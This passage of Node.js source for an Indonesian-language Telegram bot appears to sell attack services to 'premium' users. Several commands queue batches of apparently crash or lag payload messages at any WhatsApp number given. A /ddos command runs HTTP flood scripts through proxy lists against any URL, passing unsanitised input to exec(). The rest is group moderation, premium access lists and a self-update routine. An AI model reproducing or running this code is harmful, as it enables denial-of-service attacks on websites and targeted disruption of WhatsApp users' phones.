  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /culturelag 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const userId = ctx.from.id.toString();

  const tasks = buildDelayTasksRR('DELLAY7', target, 48);

  let info;
  try {
    info = sendQueue.addBatch(userId, tasks, { cmd: 'crack', target: q });
  } catch (err) {
    return ctx.reply(`⚠️ *Gagal masuk antrian*\n\n${err.message}`, { parse_mode: 'Markdown' });
  }

  await showLoadingAnimation(ctx, target, info);
});

bot.command("lages", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /culturelag 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const userId = ctx.from.id.toString();

  const tasks = buildDelayTasksRR('DELLAY8', target, 48);

  let info;
  try {
    info = sendQueue.addBatch(userId, tasks, { cmd: 'lages', target: q });
  } catch (err) {
    return ctx.reply(`⚠️ *Gagal masuk antrian*\n\n${err.message}`, { parse_mode: 'Markdown' });
  }

  await showLoadingAnimation(ctx, target, info);
});

bot.command("zras", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /culturelag 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const userId = ctx.from.id.toString();

  const tasks = buildDelayTasksRR('DELLAY9', target, 48);

  let info;
  try {
    info = sendQueue.addBatch(userId, tasks, { cmd: 'zras', target: q });
  } catch (err) {
    return ctx.reply(`⚠️ *Gagal masuk antrian*\n\n${err.message}`, { parse_mode: 'Markdown' });
  }

  await showLoadingAnimation(ctx, target, info);
});

bot.command("xios1", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /culturelag 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const userId = ctx.from.id.toString();

  const tasks = buildDelayTasksRR('DELLAY8', target, 55);

  let info;
  try {
    info = sendQueue.addBatch(userId, tasks, { cmd: 'xios1', target: q });
  } catch (err) {
    return ctx.reply(`⚠️ *Gagal masuk antrian*\n\n${err.message}`, { parse_mode: 'Markdown' });
  }

  await showLoadingAnimation(ctx, target, info);
});

bot.command("xios2", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /culturelag 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const userId = ctx.from.id.toString();

  const tasks = buildDelayTasksRR('DELLAY9', target, 55);

  let info;
  try {
    info = sendQueue.addBatch(userId, tasks, { cmd: 'xios2', target: q });
  } catch (err) {
    return ctx.reply(`⚠️ *Gagal masuk antrian*\n\n${err.message}`, { parse_mode: 'Markdown' });
  }

  await showLoadingAnimation(ctx, target, info);
});

bot.command("xios3", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /culturelag 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const userId = ctx.from.id.toString();

  const tasks = buildDelayTasksRR('DELLAY6', target, 55);

  let info;
  try {
    info = sendQueue.addBatch(userId, tasks, { cmd: 'xios3', target: q });
  } catch (err) {
    return ctx.reply(`⚠️ *Gagal masuk antrian*\n\n${err.message}`, { parse_mode: 'Markdown' });
  }

  await showLoadingAnimation(ctx, target, info);
});

bot.command("forcex", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /forcex 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const userId = ctx.from.id.toString();

  const tasks = buildGrenTasks(target, 5);

  let info;
  try {
    info = sendQueue.addBatch(userId, tasks, { cmd: 'forcex', target: q });
  } catch (err) {
    return ctx.reply(`⚠️ *Gagal masuk antrian*\n\n${err.message}`, { parse_mode: 'Markdown' });
  }

  await showLoadingAnimation(ctx, target, info);
});

bot.command("payload", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /payload 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const userId = ctx.from.id.toString();

  const tasks = buildOrtuTasks(target, 5);

  let info;
  try {
    info = sendQueue.addBatch(userId, tasks, { cmd: 'payload', target: q });
  } catch (err) {
    return ctx.reply(`⚠️ *Gagal masuk antrian*\n\n${err.message}`, { parse_mode: 'Markdown' });
  }

  await showLoadingAnimation(ctx, target, info);
});

// ============================================================
// ANTI PROMO
// ============================================================
const promoKeywords = [
  'join', 'gabung', 'promo', 'diskon', 'gratis', 'free',
  'klik', 'click', 'http://', 'https://', 't.me/', 'wa.me/',
  'bit.ly', 'linktr', 'invite', 'daftar', 'register', 'sell',
  'fs', 'forsell', 'apk bug', 'apk', 'minat', 'contact',
  'jual', 'beli', 'order', 'harga', 'murah', 'terjangkau',
  'channel', 'group', 'grup', 'bot baru', 'cek bio',
];

const PROMO_MUTE_DURATION_MS = 5 * 60 * 1000;
const mutedPromo = new Map();
const antiPromoGroups = new Map();

function isPromoMessage(text) {
  if (!text) return false;
  const lower = text.toLowerCase();
  return promoKeywords.some(k => lower.includes(k));
}

async function isGroupAdmin(ctx, userId) {
  try {
    const member = await ctx.telegram.getChatMember(ctx.chat.id, userId);
    return ['administrator', 'creator'].includes(member.status);
  } catch {
    return false;
  }
}

bot.command('antipromo', async (ctx) => {
  if (ctx.chat?.type === 'private') {
    return ctx.reply('⚠️ Command ini hanya bisa digunakan di dalam group.');
  }

  const userId = ctx.from.id.toString();
  const groupId = ctx.chat.id.toString();

  const isOwnerUser = isOwner(userId);
  const isAdmin = await isGroupAdmin(ctx, ctx.from.id);
  if (!isOwnerUser && !isAdmin) {
    return ctx.reply('⛔ Hanya owner atau admin group yang bisa menggunakan command ini.');
  }

  const arg = (ctx.message.text.split(' ')[1] || '').toLowerCase();
  const groupTitle = ctx.chat.title || groupId;

  if (arg === 'on') {
    antiPromoGroups.set(groupId, true);
    return ctx.reply(
      `✅ *Anti-Promo* telah *diaktifkan* di group ini!\n` +
      `🏠 Group: *${groupTitle}*\n\n` +
      `Setiap pesan promosi akan dihapus & pengirim di-mute 5 menit.`,
      { parse_mode: 'Markdown' }
    );
  } else if (arg === 'off') {
    antiPromoGroups.set(groupId, false);
    return ctx.reply(
      `🔕 *Anti-Promo* telah *dinonaktifkan* di group ini!\n` +
      `🏠 Group: *${groupTitle}*`,
      { parse_mode: 'Markdown' }
    );
  } else {
    const isActive = antiPromoGroups.get(groupId) === true;
    const status = isActive ? '🟢 *ON*' : '🔴 *OFF*';
    return ctx.reply(
      `ℹ️ Status Anti-Promo di *${groupTitle}*: ${status}\n\n` +
      `Gunakan:\n` +
      `• \`/antipromo on\` — aktifkan di group ini\n` +
      `• \`/antipromo off\` — nonaktifkan di group ini`,
      { parse_mode: 'Markdown' }
    );
  }
});

bot.use(async (ctx, next) => {
  if (!ctx.message?.text) return next();
  if (ctx.chat?.type === 'private') return next();
  if (!ctx.from) return next();

  const groupId = ctx.chat.id.toString();

  if (antiPromoGroups.get(groupId) !== true) return next();

  const userId = ctx.from.id.toString();

  if (OWNER_IDS.map(String).includes(userId)) return next();
  const isAdmin = await isGroupAdmin(ctx, ctx.from.id);
  if (isAdmin) return next();

  const text = ctx.message.text;
  if (!isPromoMessage(text)) return next();

  const username = ctx.from.username ? `@${ctx.from.username}` : `#${userId}`;
  const fullName = `${ctx.from.first_name || ''}${ctx.from.last_name ? ' ' + ctx.from.last_name : ''}`.trim();
  const muteStart = new Date();
  const muteEnd = new Date(Date.now() + PROMO_MUTE_DURATION_MS);

  mutedPromo.set(userId, muteEnd.getTime());

  try {
    await ctx.deleteMessage();
  } catch (e) {
    console.error('Gagal hapus pesan:', e.message);
  }

  try {
    await ctx.telegram.restrictChatMember(ctx.chat.id, ctx.from.id, {
      permissions: {
        can_send_messages: false,
        can_send_media_messages: false,
        can_send_other_messages: false,
        can_add_web_page_previews: false,
      },
      until_date: Math.floor(muteEnd.getTime() / 1000),
    });
  } catch (e) {
    console.error('Gagal mute:', e.message);
  }

  const logMessage =
    `\`\`\`javascript\n` +
    `┏━━━〔 ✞ 𝕽 𝕬 𝕱 𝕬 𝕰 𝕷 ✞ 〕━━━┓\n` +
    `   >> ANTI PROMOSI — AUTO MUTE <<\n` +
    `┗━━━━━━━━━━━━━━━━━━━━━━━┛\n\n` +
    `╭───〔 𝐋𝐎𝐆 𝐈𝐍𝐅𝐎 〕───╮\n` +
    `│ ◈ USER    : ${username}\n` +
    `│ ◈ NAMA    : ${fullName}\n` +
    `│ ◈ USER ID : ${userId}\n` +
    `│ ◈ GROUP   : ${ctx.chat.title || '-'}\n` +
    `│ ◈ PESAN   : ${text.slice(0, 50)}...\n` +
    `│ ◈ MUTE    : 5 Menit\n` +
    `│ ◈ MULAI   : ${formatDateTime(muteStart)}\n` +
    `│ ◈ BEBAS   : ${formatDateTime(muteEnd)}\n` +
    `╰──────────────────────╯\n` +
    `\`\`\``;

  try {
    await ctx.telegram.sendPhoto(OWNER_ID, MENU_PHOTO, {
      caption: logMessage,
      parse_mode: 'Markdown'
    });
  } catch (e) {
    console.error('Gagal kirim log owner:', e.message);
  }

  if (LOG_GROUP_ID) {
    try {
      await ctx.telegram.sendPhoto(LOG_GROUP_ID, MENU_PHOTO, {
        caption: logMessage,
        parse_mode: 'Markdown'
      });
    } catch (e) {
      console.error('Gagal kirim log group:', e.message);
    }
  }

  await ctx.replyWithPhoto(MENU_PHOTO, {
    caption:
      `🚫 *${fullName}* terdeteksi mengirim *pesan promosi* dan telah di-mute!\n\n` +
      `⏰ *Mulai* : ${formatDateTime(muteStart)}\n` +
      `✅ *Bebas* : ${formatDateTime(muteEnd)}`,
    parse_mode: 'Markdown'
  });

  return;
});

bot.command('addpromo', async (ctx) => {
  if (!ctx.from) return;
  if (!isOwner(ctx.from.id)) {
    return ctx.reply('❌ Hanya owner yang bisa menggunakan command ini!');
  }
  const args = ctx.message.text.split(' ').slice(1).join(' ').toLowerCase();
  if (!args) return ctx.reply('⚠️ Contoh: /addpromo kata_promo');
  if (promoKeywords.includes(args)) return ctx.reply('⚠️ Keyword sudah ada!');
  promoKeywords.push(args);
  await ctx.reply(`✅ Keyword *${args}* berhasil ditambahkan!`, { parse_mode: 'Markdown' });
});

bot.command('delpromo', async (ctx) => {
  if (!ctx.from) return;
  if (!isOwner(ctx.from.id)) {
    return ctx.reply('❌ Hanya owner yang bisa menggunakan command ini!');
  }
  const args = ctx.message.text.split(' ').slice(1).join(' ').toLowerCase();
  if (!args) return ctx.reply('⚠️ Contoh: /delpromo kata_promo');
  const idx = promoKeywords.indexOf(args);
  if (idx === -1) return ctx.reply('⚠️ Keyword tidak ditemukan!');
  promoKeywords.splice(idx, 1);
  await ctx.reply(`✅ Keyword *${args}* berhasil dihapus!`, { parse_mode: 'Markdown' });
});

bot.command('listpromo', async (ctx) => {
  if (!ctx.from) return;
  if (!isOwner(ctx.from.id)) {
    return ctx.reply('❌ Hanya owner yang bisa menggunakan command ini!');
  }
  const list = promoKeywords.map((k, i) => `${i + 1}. ${k}`).join('\n');
  await ctx.reply(`📋 *Daftar Keyword Promosi:*\n\n${list}`, { parse_mode: 'Markdown' });
});

bot.command('unmute', async (ctx) => {
  if (!ctx.from) return;
  if (!isOwner(ctx.from.id)) {
    return ctx.reply('❌ Hanya owner yang bisa menggunakan command ini!');
  }
  const target = ctx.message.reply_to_message;
  if (!target) return ctx.reply('⚠️ Reply pesan user yang mau di-unmute!');

  try {
    await ctx.telegram.restrictChatMember(ctx.chat.id, target.from.id, {
      permissions: {
        can_send_messages: true,
        can_send_media_messages: true,
        can_send_other_messages: true,
        can_add_web_page_previews: true,
      },
    });
    mutedPromo.delete(target.from.id.toString());
    await ctx.reply(`✅ *${target.from.first_name}* berhasil di-unmute!`, { parse_mode: 'Markdown' });
  } catch (e) {
    await ctx.reply('❌ Gagal unmute: ' + e.message);
  }
});

// ============================================================
// DDOS
// ============================================================
bot.command('ddos', checkPremium, async (ctx) => {
  const input = ctx.message.text.substring(6).trim().split(/\s+/); 
  const target = input[0];
  const time = input[1];
  const methods = input[2];

  if (!target || !time || !methods) {
    return ctx.reply(
      "Contoh Penggunaan:\n/ddos https://example.com 60 pidoras",
      { parse_mode: "HTML" }
    );
  }

  await ctx.telegram.sendPhoto(ctx.chat.id, MENU_PHOTO, {
    caption: `
<blockquote>(  ∞  )  𝕽 𝕬 𝕱 𝕬 𝕰 �𝕷</blockquote>
𖤓 Target: ${target}
𖤓 Time: ${time}
𖤓 Metode: ${methods}`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check Target", url: `https://check-host.net/check-http?host=${target}` }
      ]]
    }
  });

  if (methods === "strike") {
    exec(`node ./methods/strike.js GET ${target} ${time} 4 90 proxy.txt --full`);
  } else if (methods === "mix") {
    exec(`node ./methods/strike.js GET ${target} ${time} 4 90 proxy.txt --full`);
    exec(`node methods/flood.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node methods/H2F3.js ${target} ${time} 500 10 proxy.txt`);
    exec(`node methods/pidoras.js ${target} ${time} 100 10 proxy.txt`);
  } else if (methods === "flood") {
    exec(`node methods/flood.js ${target} ${time} 100 10 proxy.txt`);
  } else if (methods === "h2vip") {
    exec(`node methods/H2F3.js ${target} ${time} 500 10 proxy.txt`);
    exec(`node methods/pidoras.js ${target} ${time} 100 10 proxy.txt`);
  } else if (methods === "h2") {
    exec(`node methods/H2F3.js ${target} ${time} 500 10 proxy.txt`);
  } else if (methods === "pidoras") {
    exec(`node methods/pidoras.js ${target} ${time} 100 10 proxy.txt`);
  } else {
    ctx.reply("❌ Metode tidak dikenali atau format salah.");
  }
});

// ============================================================
// BLOCK CMD — SET GLOBAL DISABLED
// ============================================================
bot.command("blockcmd", checkAdmin, async (ctx) => {
  try {
    if (ctx.chat.type === "private")
      return ctx.reply("❌ Command ini hanya untuk grup.");

    const args = ctx.message.text.split(" ").slice(1);
    if (!args[0]) return ctx.reply("Example : /blockcmd /menu");

    let cmd = args[0].toLowerCase();
    // Pastikan diawali "/"
    if (!cmd.startsWith("/")) cmd = "/" + cmd;

    const db = loadDB();
    const groupId = String(ctx.chat.id);

    // Set GLOBAL disabled supaya muncul ❌ di menu bug
    if (!db.commands) db.commands = {};
    db.commands[cmd] = {
      disabled: true,
      reason: args.slice(1).join(" ") || "Command ini dimatikan oleh admin."
    };

    // Set group-specific block juga
    if (!db.groupCmdBlock) db.groupCmdBlock = {};
    if (!db.groupCmdBlock[groupId]) db.groupCmdBlock[groupId] = [];

    if (!db.groupCmdBlock[groupId].includes(cmd)) {
      db.groupCmdBlock[groupId].push(cmd);
    }

    saveDB(db);
    ctx.reply(`✅ Berhasil block command ${cmd} (global + grup ini)`);
  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi error.");
  }
});

bot.command("unblockcmd", checkAdmin, async (ctx) => {
  try {
    if (ctx.chat.type === "private")
      return ctx.reply("❌ Command ini hanya untuk grup.");

    const args = ctx.message.text.split(" ").slice(1);
    if (!args[0]) return ctx.reply("Example : /unblockcmd /menu");

    let cmd = args[0].toLowerCase();
    if (!cmd.startsWith("/")) cmd = "/" + cmd;

    const db = loadDB();
    const groupId = String(ctx.chat.id);

    // Hapus global disabled
    if (db.commands?.[cmd]) {
      delete db.commands[cmd];
    }

    // Hapus dari group block
    if (db.groupCmdBlock?.[groupId]) {
      db.groupCmdBlock[groupId] = db.groupCmdBlock[groupId].filter(c => c !== cmd);
    }

    saveDB(db);
    ctx.reply(`✅ Berhasil unblock command ${cmd} (global + grup ini)`);
  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi error.");
  }
});

bot.command("listblockcmd", async (ctx) => {
  try {
    const db = loadDB();
    const chatId = String(ctx.chat.id);
    const blocked = db.groupCmdBlock?.[chatId] || [];

    // Tampilkan global disabled juga
    const globalDisabled = Object.entries(db.commands || {})
      .filter(([_, v]) => v?.disabled === true)
      .map(([k]) => k);

    let teks = `📌 *LIST BLOCK COMMAND*\n\n`;

    if (blocked.length > 0) {
      teks += `*Blocked di grup ini:*\n`;
      blocked.forEach((cmd, i) => {
        teks += `${i + 1}. ${cmd} ❌\n`;
      });
    } else {
      teks += `_Tidak ada command diblok di grup ini_\n`;
    }

    if (globalDisabled.length > 0) {
      teks += `\n*Global disabled:*\n`;
      globalDisabled.forEach((cmd, i) => {
        teks += `${i + 1}. ${cmd} ❌\n`;
      });
    }

    ctx.reply(teks, { parse_mode: 'Markdown' });
  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi error.");
  }
});

// ============================================================
// APPROVED GROUP COMMANDS
// ============================================================
bot.command("approved", async (ctx) => {
  if (!ctx.from) return;
  if (!isOwner(ctx.from.id)) {
    return ctx.reply("❌ Hanya owner yang bisa approve group.");
  }

  const args = ctx.message.text.split(" ").slice(1);
  const chatId = args[0];

  if (!chatId) return ctx.reply("🪧 Format: /approved -100xxxxxxxxxx");
  if (isGroupApproved(chatId)) return ctx.reply("⚠️ Group ini sudah di-approve.");

  approvedGroups.push(String(chatId));
  saveApprovedGroups();

  if (pendingGroups.has(String(chatId))) {
    clearTimeout(pendingGroups.get(String(chatId)).timeout);
    pendingGroups.delete(String(chatId));
  }

  try {
    await ctx.telegram.sendMessage(
      chatId,
      "✅ Group ini telah di-approve oleh owner. Bot sekarang aktif di sini."
    );
  } catch (e) {}

  return ctx.reply(`✅ Group ${chatId} berhasil di-approve.`);
});

bot.command("unapproved", async (ctx) => {
  if (!ctx.from) return;
  if (!isOwner(ctx.from.id)) {
    return ctx.reply("❌ Hanya owner yang bisa mencabut approve.");
  }

  const args = ctx.message.text.split(" ").slice(1);
  const chatId = args[0];

  if (!chatId) return ctx.reply("🪧 Format: /unapproved -100xxxxxxxxxx");
  if (!isGroupApproved(chatId)) return ctx.reply("⚠️ Group ini belum di-approve.");

  approvedGroups = approvedGroups.filter((id) => id !== String(chatId));
  saveApprovedGroups();

  try {
    await ctx.telegram.sendMessage(
      chatId,
      "⚠️ Approval group ini dicabut oleh owner. Bot akan nonaktif di sini."
    );
  } catch (e) {}

  return ctx.reply(`✅ Approval group ${chatId} berhasil dicabut.`);
});

bot.command("listapprovedgroup", async (ctx) => {
  if (!ctx.from) return;
  if (!isOwner(ctx.from.id)) {
    return ctx.reply("❌ Hanya owner yang bisa melihat daftar.");
  }

  if (approvedGroups.length === 0) {
    return ctx.reply("📭 Belum ada group yang di-approve.");
  }

  const text = approvedGroups.map((id, i) => `${i + 1}. ${id}`).join("\n");
  return ctx.reply(`📋 Daftar group approved:\n\n${text}`);
});

// ============================================================
// UPDATE COMMANDS
// ============================================================
bot.command("update", checkOwner, async (ctx) => {
  await performUpdate(ctx);
});

bot.command("version", checkOwner, async (ctx) => {
  try {
    const res = await axios.get(UPDATE_URL, {
      headers: UPDATE_HEADERS,
      timeout: 15000,
      responseType: "text",
    });
    const remoteContent = res.data;
    const localContent = fs.readFileSync(UPDATE_FILE_PATH, "utf8");

    const hash = (s) => crypto.createHash("md5").update(s).digest("hex");
    const isLatest = hash(remoteContent) === hash(localContent);

    await ctx.replyWithMarkdown(
      `🤖 *INFO VERSI BOT*\n\n` +
        `📦 Lokal  : \`${hash(localContent).slice(0, 8)}\`\n` +
        `☁️ Remote : \`${hash(remoteContent).slice(0, 8)}\`\n\n` +
        `Status : ${isLatest ? "✅ Versi terbaru" : "⚠️ Ada update tersedia"}\n\n` +
        `Gunakan /update untuk update manual.`
    );
  } catch (err) {
    await ctx.reply(`❌ Gagal cek versi: ${err.message}`);
  }
});

// ============================================================
// ADMIN/PREMIUM MANAGEMENT
// ============================================================
bot.command("addadmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("❌ Format Salah!. Example: /addadmin 12345678");
  }

  const userId = args[1];

  if (adminUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status admin.`);
  }

  adminUsers.push(userId);
  saveJSON(adminFile, adminUsers);
  return ctx.reply(`✅ Pengguna ${userId} sekarang memiliki akses admin!`);
});

bot.command("addprem", checkOwner, (ctx) => {
  const args = ctx.message.text.trim().split(" "); 
  if (args.length < 2) {
    return ctx.reply("❌ Format Salah!. Example : /addprem 12345678");
  }

  const userId = args[1].toString();
  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki akses premium.`);
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);
  return ctx.reply(`✅ Pengguna ${userId} sekarang adalah premium.`);
});

bot.command("deladmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("❌ Format Salah!. Example : /deladmin 12345678");
  }

  const userId = args[1];
  if (!adminUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar Admin.`);
  }

  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);
  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar Admin.`);
});

bot.command("delprem", checkOwner, (ctx) => {
  const args = ctx.message.text.trim().split(" ");
  if (args.length < 2) {
    return ctx.reply("❌ Format Salah!. Example : /delprem 12345678");
  }

  const userId = args[1].toString();
  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
  }

  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);
  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari akses premium.`);
});

bot.command("cekprem", (ctx) => {
  if (!ctx.from) return;
  const userId = ctx.from.id.toString();
  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Anda adalah pengguna premium.`);
  } else {
    return ctx.reply(`❌ Anda bukan pengguna premium.`);
  }
});

// ============================================================
// PREMIUM GROUP
// ============================================================
const premiumGroupFile = './premiumGroups.json';
let premiumGroups = loadJSON(premiumGroupFile) || [];

if (!fs.existsSync(premiumGroupFile)) {
  fs.writeFileSync(premiumGroupFile, JSON.stringify([], null, 2));
}

function isGroupPremium(chatId) {
  return premiumGroups.includes(chatId.toString());
}

bot.command('addpremgroup', checkOwner, async (ctx) => {
  if (ctx.chat.type === 'private') {
    return ctx.reply('❌ Command ini hanya bisa di grup.');
  }

  const chatId = ctx.chat.id.toString();

  if (isGroupPremium(chatId)) {
    return ctx.replyWithPhoto(MENU_PHOTO, {
      caption: `\`\`\`javascript
┏━━━〔 𝕽 𝕬 𝕱 𝕬 𝕰 𝕷 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐄𝐑𝐑𝐎𝐑 〕───╮
│ ◈ STATUS  : ⚠️ Gagal
│ ◈ REASON  : Group ini sudah
│             terdaftar premium!
│ ◈ GROUP   : ${ctx.chat.title}
│ ◈ ID      : ${chatId}
╰──────────────────────╯
\`\`\``,
      parse_mode: 'Markdown'
    });
  }

  premiumGroups.push(chatId);
  saveJSON(premiumGroupFile, premiumGroups);

  await ctx.replyWithPhoto(MENU_PHOTO, {
    caption: `\`\`\`javascript
┏━━━〔 𝕽 𝕬 𝕱 𝕬 𝕰 𝕷 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 〕───╮
│ ◈ STATUS  : ✅ Berhasil
│ ◈ GROUP   : ${ctx.chat.title}
│ ◈ ID      : ${chatId}
│ ◈ AKSES   : ✨ Premium Aktif
╰──────────────────────╯
\`\`\``,
    parse_mode: 'Markdown'
  });
});

bot.command('delpremgroup', checkOwner, async (ctx) => {
  if (ctx.chat.type === 'private') {
    return ctx.reply('❌ Command ini hanya bisa di grup.');
  }

  const chatId = ctx.chat.id.toString();

  if (!isGroupPremium(chatId)) {
    return ctx.replyWithPhoto(MENU_PHOTO, {
      caption: `\`\`\`javascript
┏━━━〔 𝕽 𝕬 𝕱 𝕬 𝕰 𝕷 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐄𝐑𝐑𝐎𝐑 〕───╮
│ ◈ STATUS  : ❌ Gagal
│ ◈ REASON  : Group ini bukan
│             group premium!
│ ◈ GROUP   : ${ctx.chat.title}
│ ◈ ID      : ${chatId}
╰──────────────────────╯
\`\`\``,
      parse_mode: 'Markdown'
    });
  }

  premiumGroups = premiumGroups.filter(id => id !== chatId);
  saveJSON(premiumGroupFile, premiumGroups);

  await ctx.replyWithPhoto(MENU_PHOTO, {
    caption: `\`\`\`javascript
┏━━━〔  𝕽 𝕬 𝕱 𝕬 𝕰 𝕷  〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐃𝐄𝐋𝐄𝐓𝐄𝐃 〕───╮
│ ◈ STATUS  : 🚫 Dihapus
│ ◈ GROUP   : ${ctx.chat.title}
│ ◈ ID      : ${chatId}
│ ◈ AKSES   : ❌ Dicabut
╰──────────────────────╯
\`\`\``,
    parse_mode: 'Markdown'
  });
});

bot.command('addpremgroupid', checkOwner, async (ctx) => {
  const args = ctx.message.text.split(' ').slice(1);

  if (!args[0]) {
    return ctx.reply("🪧 Format: /addpremgroupid -100xxx");
  }

  const chatId = args[0].toString();

  if (isGroupPremium(chatId)) {
    return ctx.reply(`⚠️ Group ${chatId} sudah premium!`);
  }

  premiumGroups.push(chatId);
  saveJSON(premiumGroupFile, premiumGroups);
  await ctx.reply(`✅ Group ${chatId} berhasil didaftarkan sebagai premium!`);
});

bot.command('delpremgroupid', checkOwner, async (ctx) => {
  const args = ctx.message.text.split(' ').slice(1);

  if (!args[0]) {
    return ctx.reply("🪧 Format: /delpremgroupid -100xxx");
  }

  const chatId = args[0].toString();

  if (!isGroupPremium(chatId)) {
    return ctx.reply(`⚠️ Group ${chatId} bukan group premium!`);
  }

  premiumGroups = premiumGroups.filter(id => id !== chatId);
  saveJSON(premiumGroupFile, premiumGroups);
  await ctx.reply(`🚫 Group ${chatId} berhasil dihapus dari premium!`);
});

bot.command("rest", checkOwner, async (ctx) => {
  const arg = (ctx.message.text.split(' ')[1] || '').toLowerCase();

  if (arg === 'on') {
    await startRestMode();
    return ctx.reply('🛑 Mode REST diaktifkan manual.');
  }

  if (arg === 'off') {
    if (bugTracker.restTimer) clearTimeout(bugTracker.restTimer);
    if (bugTracker.windowTimer) clearTimeout(bugTracker.windowTimer);
    bugTracker.isResting = false;
    bugTracker.count = 0;
    bugTracker.firstBugTime = null;
    bugTracker.restUntil = null;
    return ctx.reply('✅ Mode REST dimatikan manual.');
  }

  if (bugTracker.isResting) {
    const sisaMs = bugTracker.restUntil - Date.now();
    const sisaMenit = Math.floor(sisaMs / 60000);
    const sisaDetik = Math.floor((sisaMs % 60000) / 1000);
    return ctx.reply(
      `🛑 *STATUS: REST AKTIF*\n\n` +
      `⏳ Sisa : *${sisaMenit}m ${sisaDetik}s*\n` +
      `📊 Bug Count : *${bugTracker.count}/${BUG_REST_CONFIG.MAX_BUG_COMMANDS}*`,
      { parse_mode: 'Markdown' }
    );
  }

  return ctx.reply(
    `✅ *STATUS: NORMAL*\n\n` +
    `📊 Bug Count : *${bugTracker.count}/${BUG_REST_CONFIG.MAX_BUG_COMMANDS}*\n` +
    `⏱️ Window : 5 menit\n\n` +
    `Gunakan:\n` +
    `• \`/rest on\` — aktifkan manual\n` +
    `• \`/rest off\` — matikan manual`,
    { parse_mode: 'Markdown' }
  );
});

bot.command('listpremgroup', checkOwner, async (ctx) => {
  if (premiumGroups.length === 0) {
    return ctx.reply('📭 Belum ada group premium.');
  }

  const list = premiumGroups.map((id, i) => `${i + 1}. ${id}`).join('\n');

  await ctx.replyWithPhoto(MENU_PHOTO, {
    caption: `\`\`\`javascript
┏━━━〔 𝕽 𝕬 𝕱 𝕬 𝕰 𝕷 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐋𝐈𝐒𝐓 𝐆𝐑𝐎𝐔𝐏 〕───╮
│ ◈ TOTAL : ${premiumGroups.length} Group
├──────────────────────
${list}
╰──────────────────────╯
\`\`\``,
    parse_mode: 'Markdown'
  });
});

bot.command('cekpremgroup', async (ctx) => {
  if (ctx.chat.type === 'private') {
    return ctx.reply('❌ Command ini hanya bisa di grup.');
  }

  const chatId = ctx.chat.id.toString();
  const status = isGroupPremium(chatId);

  await ctx.replyWithPhoto(MENU_PHOTO, {
    caption: `\`\`\`javascript
┏━━━〔 𝕽 𝕬 𝕱 𝕬 𝕰 𝕷 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐒𝐓𝐀𝐓𝐔𝐒 〕───╮
│ ◈ GROUP   : ${ctx.chat.title || '-'}
│ ◈ ID      : ${chatId}
│ ◈ PREMIUM : ${status ? '✅ Aktif' : '❌ Tidak Aktif'}
╰──────────────────────╯
\`\`\``,
    parse_mode: 'Markdown'
  });
});

// ============================================================
